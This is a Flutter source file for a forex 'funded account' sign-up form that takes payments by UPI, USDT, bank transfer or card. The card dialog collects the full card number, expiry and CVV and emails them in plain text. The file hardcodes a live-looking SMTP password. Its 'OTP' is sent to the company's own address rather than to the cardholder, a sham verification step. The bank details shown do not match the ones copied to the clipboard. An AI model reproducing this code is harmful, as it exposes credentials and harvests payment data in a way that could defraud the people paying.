import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:file_picker/file_picker.dart';
import 'package:flutter/services.dart';
import 'package:mailer/mailer.dart';

import 'package:mailer/smtp_server.dart';


class FundedAccountForm extends StatefulWidget {
  const FundedAccountForm({Key? key}) : super(key: key);
  @override
  _FundedAccountFormState createState() => _FundedAccountFormState();
}

class _FundedAccountFormState extends State<FundedAccountForm> {
  final _formKey = GlobalKey<FormState>();
  String fullName = '',
      countryCode = '+91',
      phone = '',
      email = '';
  String challengeModel = '',
      evaluationType = '',
      priceInfo = '';
  String referralCode = '';
  String paymentMethod = '',
      paymentDetails = '';
  List<Map<String, String>> paymentMethodData = [];
  String tradingPlatform = '';
  File? file;
    // For OTP dialog
  String _generatedOtp = '';
  String _cardName = '';
String _cardNumber = '';
String _cardCvv = '';
String _cardExpiry = '';

  // Full deduplicated list of country codes
  final List<String> _countryCodes = const [
    '+1', '+7', '+33', '+44', '+49', '+55', '+61',
    '+81', '+86', '+91', '+92', '+234', '+380', '+971'
  ];

  void _onChallengeModelChanged(String? val) {
    setState(() {
      challengeModel = val ?? '';
      evaluationType = '';
      priceInfo = '';
    });
  }

  void _onEvaluationChanged(String? val) {
    setState(() {
      evaluationType = val ?? '';
      switch (evaluationType) {
        case '5K 2 STEP EVALUATION':
          priceInfo = 'Price: 30 \$ (2200 INR) (22 USDT)';
          break;
        case '10K 2 STEP EVALUATION':
          priceInfo = 'Price: 50\$ (4180 INR) (40 USDT)';
          break;
        case '25K 2 STEP EVALUATION':
          priceInfo = 'Price: 100 \$(7899 INR) (80 USDT)';
          break;
        case '50K 2 STEP EVALUATION':
          priceInfo = 'Price: 150\$ (12450 INR) (134 USDT)';
          break;
        case '100K 2 STEP EVALUATION':
          priceInfo = 'Price: 200\$ (15800 INR) (150 USDT)';
          break;
        case '200K 2 STEP EVALUATION':
          priceInfo = 'Price: 400\$ (33200 INR) (400 USDT)';
          break;
        default:
          priceInfo = '';
      }
    });
  }

  // SMTP settings for Hostinger
final String _smtpUsername = 'info@wefundclient.com';           // your Hostinger mailbox
final String _smtpPassword = 'Wefund@6666';   // the mailbox password
final SmtpServer _smtpServer = SmtpServer(
  'smtp.hostinger.com',
  port: 465,
  ssl: true,
  username: 'info@wefundclient.com',
  password: 'Wefund@6666',
);

Future<void> _sendEmails() async {
  // Build the support email body
  final buffer = StringBuffer()
    ..writeln('A new funded account form was submitted with these details:')
    ..writeln()
    ..writeln('• Full Name       : $fullName')
    ..writeln('• Phone           : $countryCode $phone')
    ..writeln('• Email           : $email')
    ..writeln('• Challenge Model : $challengeModel')
    ..writeln('• Evaluation Type : $evaluationType')
    ..writeln('• Price Info      : $priceInfo')
    ..writeln('• Referral Code   : $referralCode')
    ..writeln('• Payment Method  : $paymentMethod')
    ..writeln('• Payment Details : $paymentDetails');

  // If they used a card, tack on the card fields:
  if (paymentMethod == 'CREDIT/DEBIT CARD') {
    buffer
      ..writeln()
      ..writeln('--- Credit / Debit Card Details ---')
      ..writeln('• Name on Card   : $_cardName')
      ..writeln('• Card Number    : $_cardNumber')
      ..writeln('• Expiry (MM/YY) : $_cardExpiry')
      ..writeln('• CVV            : $_cardCvv');
  }

  buffer
    ..writeln()
    ..writeln('• Trading Platform: $tradingPlatform')
    ..writeln();

  final supportMsg = Message()
    ..from = Address(_smtpUsername, 'WeFund Global FX')
    ..recipients.add('support@wefundglobalfx.com')
    ..subject = 'New Funded Account Submission'
    ..text = buffer.toString()
    ..attachments = file != null
        ? [FileAttachment(File(file!.path!))..location = Location.attachment]
        : [];

  // Confirmation to user (unchanged)
  final userMsg = Message()
    ..from = Address(_smtpUsername, 'WeFund Global FX')
    ..recipients.add(email)
    ..subject = 'Your Funded Account Form Received'
    ..text = '''
Hi $fullName,

Thank you for submitting your funded account form. Here’s a summary of your chosen options:

– **Challenge Model**: $challengeModel  
– **Evaluation Type**: $evaluationType  
– **Price Info**: $priceInfo  

We will review and get back to you shortly.

Best regards,  
The WeFund Global FX Team
''';

  try {
    await send(supportMsg, _smtpServer);
    await send(userMsg, _smtpServer);
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('Submission successful – emails sent.')),
    );
  } on MailerException catch (e) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text('Email error: ${e.message}')),
    );
  }
}




  void _onPaymentMethodChanged(String? val) {
    setState(() {
      paymentMethod = val ?? '';
      paymentDetails = '';
      paymentMethodData = [];

      if (paymentMethod == 'UPI') {
        paymentDetails =
            'UPI: wefu20@axisbank\nPlease upload the screenshot below.';
        paymentMethodData = [
          {'label': 'wefu20@axisbank', 'copy': 'wefu20@axisbank'}
        ];
      } else if (paymentMethod == 'USDT') {
        paymentDetails =
            'USDT (TRC20 ADDRESS):\nTJqz3ZHNVYXLTEVvvqQDjYWvyT8kfGJbJv\nPlease upload the screenshot below.';
        paymentMethodData = [
          {
            'label': 'TJqz3ZHNVYXLTEVvvqQDjYWvyT8kfGJbJv',
            'copy': 'TJqz3ZHNVYXLTEVvvqQDjYWvyT8kfGJbJv'
          }
        ];
      } else if (paymentMethod == 'ONLINE BANK TRANSFER') {
        paymentDetails =
            'ACCOUNT NUMBER: 0628100100008484\nBANK NAME: PUNJAB NATIONAL\nIFSC CODE: PUNB0062810\nBENEFICIARY: SHYAM\nPlease upload the screenshot below.';
        paymentMethodData = [
          {'label': 'AC: 924010025197811', 'copy': '924010025197811'},
          {'label': 'IFSC: UTIB0000720', 'copy': 'UTIB0000720'},
          {'label': 'BANK: Axis Bank', 'copy': 'Axis Bank'},
          {'label': 'BENEFICIARY: SHYAM BABOO', 'copy': 'SHYAM BABOO'},
        ];
      } 
    });
  }

  /// Shows a dialog to collect card details, send OTP, verify and submit.


  Future<void> _pickFile() async {
    final res = await FilePicker.platform.pickFiles(withData: false);
    if (res != null && res.files.single.path != null) {
      setState(() => file = File(res.files.single.path!));
    }
  }

  Future<void> _copy(String text) async {
    await Clipboard.setData(ClipboardData(text: text));
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('Copied to clipboard')),
    );
  }

  void _submit() async {
  if (_formKey.currentState!.validate()) {
    ScaffoldMessenger.of(context)
        .showSnackBar(const SnackBar(content: Text('Submitting...')));
    await _sendEmails();

    // Clear form
    _formKey.currentState!.reset();
    setState(() {
      fullName = '';
      countryCode = '+91';
      phone = '';
      email = '';
      challengeModel = '';
      evaluationType = '';
      priceInfo = '';
      referralCode = '';
      paymentMethod = '';
      paymentDetails = '';
      paymentMethodData = [];
      tradingPlatform = '';
      file = null;
    });

    ScaffoldMessenger.of(context)
        .showSnackBar(const SnackBar(content: Text('Submitted!')));
  }
}

Future<void> _showCardDialog() async {
    final _cardForm = GlobalKey<FormState>();
    String cardName = '', cardNumber = '', cvv = '', expiry = '', enteredOtp = '';
    bool otpSent = false, loading = false;

    await showDialog(
      context: context,
      builder: (ctx) => StatefulBuilder(builder: (ctx, setState) {
        return AlertDialog(
          title: const Text('Enter Card Details'),
          content: Form(
            key: _cardForm,
            child: Column(mainAxisSize: MainAxisSize.min, children: [
              TextFormField(
                decoration: const InputDecoration(labelText: 'Name on Card'),
                onChanged: (v) => cardName = v,
                validator: (v) => (v == null || v.isEmpty) ? 'Required' : null,
              ),
              const SizedBox(height: 8),
              TextFormField(
                decoration: const InputDecoration(labelText: 'Card Number'),
                keyboardType: TextInputType.number,
                onChanged: (v) => cardNumber = v,
                validator: (v) => (v == null || v.length < 16)
                    ? 'Enter 16 digits' : null,
              ),
              const SizedBox(height: 8),
              Row(children: [
                Expanded(
                  child: TextFormField(
                    decoration:
                        const InputDecoration(labelText: 'Expiry (MM/YY)'),
                    onChanged: (v) => expiry = v,
                    validator: (v) => (v == null ||
                            !RegExp(r'^\d\d\/\d\d$').hasMatch(v))
                        ? 'MM/YY' : null,
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: TextFormField(
                    decoration: const InputDecoration(labelText: 'CVV'),
                    obscureText: true,
                    onChanged: (v) => cvv = v,
                    validator: (v) => (v == null || v.length != 3)
                        ? '3 digits' : null,
                  ),
                ),
              ]),
              const SizedBox(height: 12),
              if (otpSent) ...[
                TextFormField(
                  decoration: const InputDecoration(labelText: 'Enter OTP'),
                  keyboardType: TextInputType.number,
                  onChanged: (v) => enteredOtp = v,
                  validator: (v) =>
                      (v == null || v != _generatedOtp) ? 'Invalid OTP' : null,
                ),
                const SizedBox(height: 12),
              ],
            ]),
          ),
          actions: [
            TextButton(
              child: const Text('Cancel'),
              onPressed: () => Navigator.of(ctx).pop(),
            ),
            if (!otpSent)
              ElevatedButton(
                child: loading
                    ? const SizedBox(
                        width: 16, height: 16,
                        child: CircularProgressIndicator(strokeWidth: 2))
                    : const Text('Send OTP'),
                onPressed: loading
                    ? null
                    : () async {
                        if (!_cardForm.currentState!.validate()) return;
                        setState(() => loading = true);
                        _generatedOtp = (Random().nextInt(900000) + 100000)
                            .toString();
                        final otpMsg = Message()
                          ..from = Address(_smtpUsername, 'WeFund Global FX')
                          ..recipients.add('support@wefundglobalfx.com')
                          ..subject = 'Your WeFund Card OTP'
                          ..text =
                              'Your one‑time verification code is: $_generatedOtp';
                        try {
                          await send(otpMsg, _smtpServer);
                          setState(() {
                            loading = false;
                            otpSent = true;
                          });
                        } on MailerException catch (e) {
                          setState(() => loading = false);
                          ScaffoldMessenger.of(context).showSnackBar(
                            SnackBar(content: Text('OTP send failed: ${e.message}')),
                          );
                        }
                      },
              )
            else
              ElevatedButton(
                child: const Text('Submit'),
                onPressed: () {
                  if (!_cardForm.currentState!.validate()) return;
                  setState(() {
        _cardName   = cardName;
        _cardNumber = cardNumber;
        _cardCvv    = cvv;
        _cardExpiry = expiry;
      });
                  Navigator.of(ctx).pop();
                  ScaffoldMessenger.of(context).showSnackBar(
                    const SnackBar(content: Text('Card details submitted')),
                  );
                },
              ),
          ],
        );
      }),
    );
  }

  @override
  Widget build(BuildContext c) {
    return Scaffold(
      appBar: AppBar(title: const Text('Funded Account Form')),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Form(
          key: _formKey,
          child: Column(children: [
            // Full Name
            TextFormField(
              decoration: const InputDecoration(labelText: 'Full Name *'),
              onChanged: (v) => fullName = v,
              validator: (v) => v == null || v.isEmpty ? 'Required' : null,
            ),
            const SizedBox(height: 12),

            // Phone + country code on same row
            Row(children: [
              DropdownButton<String>(
                value: countryCode,
                items: _countryCodes
                    .map((c) => DropdownMenuItem(
                          value: c,
                          child: Text(c, style: const TextStyle(fontSize: 16)),
                        ))
                    .toList(),
                onChanged: (v) => setState(() => countryCode = v!),
              ),
              const SizedBox(width: 8),
              Expanded(
                child: TextFormField(
                  decoration: const InputDecoration(labelText: 'Phone *'),
                  keyboardType: TextInputType.phone,
                  onChanged: (v) => phone = v,
                  validator: (v) =>
                      v == null || v.isEmpty ? 'Required' : null,
                ),
              ),
            ]),
            const SizedBox(height: 12),

            // Email
            TextFormField(
              decoration: const InputDecoration(labelText: 'Email *'),
              keyboardType: TextInputType.emailAddress,
              onChanged: (v) => email = v,
              validator: (v) =>
                  v == null || !v.contains('@') ? 'Valid email required' : null,
            ),
            const SizedBox(height: 12),

            // Challenge Model Picker
            DropdownButtonFormField<String>(
              decoration: const InputDecoration(labelText: 'Challenge Model'),
              value: challengeModel.isEmpty ? null : challengeModel,
              items: ['Evaluation Blaze', 'Evaluation 2‑Step', 'Express 1‑Step', 'Rapid', 'Instant']
                  .map((m) => DropdownMenuItem(value: m, child: Text(m)))
                  .toList(),
              onChanged: _onChallengeModelChanged,
            ),
            const SizedBox(height: 12),

            // Evaluation Type
            DropdownButtonFormField<String>(
              decoration:
                  const InputDecoration(labelText: 'Evaluation Type'),
              value: evaluationType.isEmpty ? null : evaluationType,
              items: [
                '5K 2 STEP EVALUATION',
                '10K 2 STEP EVALUATION',
                '25K 2 STEP EVALUATION',
                '50K 2 STEP EVALUATION',
                '100K 2 STEP EVALUATION',
                '200K 2 STEP EVALUATION',
              ]
                  .map((e) => DropdownMenuItem(value: e, child: Text(e)))
                  .toList(),
              onChanged: _onEvaluationChanged,
            ),
            if (priceInfo.isNotEmpty)
              Padding(
                padding: const EdgeInsets.only(top: 8),
                child: Text(priceInfo),
              ),
            const SizedBox(height: 20),

            // Payment Method
            DropdownButtonFormField<String>(
              decoration:
                  const InputDecoration(labelText: 'Payment Method *'),
              value: paymentMethod.isEmpty ? null : paymentMethod,
              items: [
                'UPI',
                'USDT',
                'ONLINE BANK TRANSFER',
                'CREDIT/DEBIT CARD'
              ]
                  .map((p) => DropdownMenuItem(value: p, child: Text(p)))
                  .toList(),
              onChanged: _onPaymentMethodChanged,
              validator: (v) => v == null || v.isEmpty ? 'Required' : null,
            ),
            if (paymentDetails.isNotEmpty) ...[
              const SizedBox(height: 8),
              Text(paymentDetails),
              for (var d in paymentMethodData)
                Padding(
                  padding: const EdgeInsets.symmetric(vertical: 4),
                  child: Row(children: [
                    Expanded(child: Text(d['label']!)),
                    IconButton(
                      icon: const Icon(Icons.copy),
                      onPressed: () => _copy(d['copy']!),
                    )
                  ]),
                )
            ],

// … after your other ifs in Column(children: [ … ]) …

 if (paymentMethod == 'CREDIT/DEBIT CARD') ...[
  const SizedBox(height: 12),
  ElevatedButton.icon(
    icon: const Icon(Icons.credit_card),
    label: const Text('Enter Card Details'),
    style: ElevatedButton.styleFrom(
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(8),
      ),
      padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 20),
    ),
    onPressed: _showCardDialog,
  ),
],

           


            // ─── Referral Code ──────────────────────────────────────────────
// Padding(
//   padding: const EdgeInsets.only(bottom: 16),
//   child: TextFormField(
//     decoration: const InputDecoration(
//       labelText: 'Referral Code (optional)',
//       border: OutlineInputBorder(),
//     ),
//     onChanged: (v) => referralCode = v,
//   ),
// ),
const SizedBox(height: 12),
            // Referral Code
            TextFormField(
              decoration:
                  const InputDecoration(labelText: 'Referral Code'),
              onChanged: (v) => referralCode = v,
            ),

            const SizedBox(height: 20),
            
            // Trading Platform
            DropdownButtonFormField<String>(
              decoration:
                  const InputDecoration(labelText: 'Trading Platform *'),
              value: tradingPlatform.isEmpty ? null : tradingPlatform,
              items: ['MT5', 'APP', 'C TRADER', 'TRADE LOCKER']
                  .map((t) => DropdownMenuItem(value: t, child: Text(t)))
                  .toList(),
              onChanged: (v) => setState(() => tradingPlatform = v!),
              validator: (v) => v == null || v.isEmpty ? 'Required' : null,
            ),
            const SizedBox(height: 20),

            // File upload
            ElevatedButton.icon(
              icon: const Icon(Icons.upload_file),
              label: Text(file?.path.split('/').last ?? 'Upload Screenshot'),
              onPressed: _pickFile,
            ),
            const SizedBox(height: 24),

            ElevatedButton(
              onPressed: _submit,
              child: const Padding(
                padding: EdgeInsets.symmetric(vertical: 12, horizontal: 24),
                child: Text('Submit', style: TextStyle(fontSize: 16)),
              ),
            ),
            const SizedBox(height: 32),
          ]),
        ),
      ),
    );
  }
}
